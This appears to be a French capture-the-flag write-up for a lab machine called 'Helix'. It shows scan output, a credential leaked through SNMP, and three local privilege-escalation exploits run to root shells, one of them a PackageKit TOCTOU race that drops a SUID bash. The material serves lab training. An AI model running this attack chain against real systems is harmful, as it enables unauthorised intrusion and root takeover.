# Helix

🖥️ **rNET**

Découverte d’hotes

```
┌──[m0rph3u5@parrot]─[~/Scripts]
└──╼ $sudo ./rNET.sh 
                                               
░       ░░░   ░░░  ░░        ░░        ░
▒  ▒▒▒▒  ▒▒    ▒▒  ▒▒  ▒▒▒▒▒▒▒▒▒▒▒  ▒▒▒▒
▓       ▓▓▓  ▓  ▓  ▓▓      ▓▓▓▓▓▓▓  ▓▓▓▓
█  ███  ███  ██    ██  ███████████  ████
█  ████  ██  ███   ██        █████  ████
                                                   
                                                
by M0rPH3U53

🔍 Scan ARP...100%
 
[+] Hotes 
 
┌────────────────┬───────────────────┬──────────────────────────────┐
│       🖥️       │         ⚙️        │              🏭              │
├────────────────┼───────────────────┼──────────────────────────────┤
│ 192.168.56.1   │ 0a:00:27:00:00:00 │ Unknown vendor               │
│ 192.168.56.2   │ 08:00:27:06:49:51 │ PCS Systemtechnik GmbH       │
│ 192.168.56.254 │ 08:00:27:05:87:b3 │ PCS Systemtechnik GmbH       │
└────────────────┴───────────────────┴──────────────────────────────┘
 
[+] Total: 3
```

&nbsp;

<span style="color: #dddddd;">👁️</span> **Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo ./massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] IP: 192.168.56.254
[i] Rate: 1000
 
🔥 Masscan 192.168.56.254...100%
👁️ Nmap 192.168.56.254...100%
 
[+] 22/tcp open
 
📄 Rapport --> /home/m0rph3u5/Massap
```

&nbsp;

**🔥 Nmap**

Scan UDP

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo nmap -sU --open 192.168.56.254
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-08 07:43 UTC
Nmap scan report for 192.168.56.254
Host is up (0.00032s latency).

PORT    STATE SERVICE
161/udp open  snmp
MAC Address: 08:00:27:70:1D:9E (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 0.54 seconds
```

&nbsp;

🧙‍♂️ **mapSploit**

Recupere les info de la machine cible

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $sudo ./mapSploit.sh
  
eee......eee..eeeeee..eeeeeee...eeeeee.eeeeeee..eee.....eeeeee..eee.eeeeeeeee.
@@@@::::@@@@:@@@@@@@@:@@@@@@@@:@@@@@@@:@@@@@@@@:@@@::::@@@@@@@@:@@@:@@@@@@@@@:
%%%%%--%%%%%-%%%--%%%-%%%--%%%-%%%-----%%%--%%%-%%%----%%%--%%%-%%%----%%%----
&&&&&&&&&&&&+&&&&&&&&+&&&&&&&&+&&&&&&++&&&&&&&&+&&&++++&&&++&&&+&&&++++&&&++++
|||*||||*|||*||||||||*|||||||***||||||*|||||||**|||****|||**|||*|||****|||****
!!!==!!==!!!=!!!==!!!=!!!==========!!!=!!!======!!!====!!!==!!!=!!!====!!!====
:::######:::#:::##:::#:::######:::::::#:::######::::::#::::::::#:::####:::####
...@@@@@@...@...@@...@...@@@@@@......@@...@@@@@@......@@......@@...@@@@...@@@@
                                                                                                                  

by M0rPH3U53
      
[+] Réseau 
 
10.0.3.0/24
192.168.56.0/24
 
[i] Network: 192.168.56.0/24
 
🔍 Scan SNMP...100%
 
[+] Hotes
 
📡 192.168.56.254 --> 192.168.56.254-snmp.txt
 
[+] Sauvegardé --> /home/m0rph3u5/Desktop/mapSploit
```

&nbsp;

Login trouvé

```
┌─[m0rph3u5@parrot]─[~/Desktop]
└──╼ $cat mapSploit/192.168.56.254-snmp.txt
RHOSTS => 192.168.56.254
verbose => true
[+] 192.168.56.254, Connected.

[*] System information:

Host IP                       : 192.168.56.254
Hostname                      : debian
Description                   : Linux debian 6.12.74+deb13+1-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.12.74-2 (2026-03-08) x86_64
Contact                       : Me:lixeh22
Location                      : Sitting on the Dock of the Bay
Uptime snmp                   : 00:42:46.47
Uptime system                 : 00:02:19.77
System date                   : 2026-5-11 16:41:43.0
```

&nbsp;

**🛰️ fullEx**

&nbsp;3 LPE au choix 🙂

**DirtyFrag**

```
me@helix:~/fullEx$ ./fullEx.sh -DirtyFrag
# bash -i
root@helix:/home/me/fullEx#
```

&nbsp;

**Package2TheRoot**

```
me@helix:~/fullEx$ ./fullEx.sh -PKroot
============================================================
Safe CVE-2026-41651 (Pack2TheRoot) Vulnerability Checker
Purpose: Detect if PackageKit is vulnerable to the TOCTOU LPE
Author: Ashraf Zaryouh / @0xBlackash
Usage: chmod +x CVE-2026-41651.sh && ./CVE-2026-41651.sh
============================================================
[+] SUID drop directory: /var/tmp
[+] Package format: DEB
[*] Building test packages...
[+] Dummy: /tmp/pk-dummy-1026.deb
[+] Payload: /tmp/pk-payload-1026.deb
[+] SUID target: /var/tmp/.suid_bash
[*] Creating PackageKit transaction...
[+] Transaction ID: /8_eebebcbd
[*] Firing TOCTOU race (SIMULATE → REAL)...
[*] Polling for SUID root bash (90 sec max)...

[+] SUID confirmed: /var/tmp/.suid_bash (mode=4755)

[+] Dropping to root shell (bash -p)
[+] --- ROOT SHELL FOLLOWS ---
.suid_bash-5.2#
```

&nbsp;

**Copy Fail**

```
me@helix:~/fullEx$ ./fullEx.sh -CFail
# bash -i
root@helix:/home/me/fullEx#
```